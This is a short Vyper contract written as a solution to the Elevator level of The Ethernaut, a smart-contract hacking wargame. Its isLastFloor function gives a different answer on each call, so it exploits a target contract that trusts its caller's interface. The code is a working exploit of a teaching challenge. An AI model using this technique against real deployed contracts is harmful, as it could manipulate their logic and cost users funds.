# pragma version 0.4.0
"""
@title A hack for level 11 (Elevator) of The Ethernaut
@license MIT
@author unluckyduke7
"""

interface Elevator:
	def goTo(_floor: uint256): nonpayable


counter: transient(uint256)


@external
def hack(instance: Elevator):
	extcall instance.goTo(0)


@external
def isLastFloor(_: uint256) -> bool:
	counter: uint256 = self.counter
	self.counter = counter + 1

	if counter != 0:
		return True
	return False
